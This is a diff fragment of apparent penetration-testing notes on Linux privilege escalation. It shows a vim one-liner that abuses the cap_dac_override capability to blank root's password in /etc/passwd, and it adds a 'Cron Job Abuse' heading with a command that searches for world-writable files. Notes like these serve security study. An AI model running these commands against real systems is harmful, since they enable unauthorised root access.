@@ -286,3 +286,11 @@ $ echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
 $ cat /etc/passwd | head -n1
 ```
 %% For example, the /usr/bin/vim.basic binary is run without special privileges, such as with sudo. However, because the binary has the cap_dac_override capability set, it can escalate the privileges of the user who runs it. This would allow the penetration tester to gain the cap_dac_override capability and perform tasks that require this capability. We can use the cap_dac_override capability of the /usr/bin/vim binary to modify a system file: %%
+
+
+### Cron Job Abuse
+
+```
+$ find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
+```
+%% command to look for any writeable files or directories%%
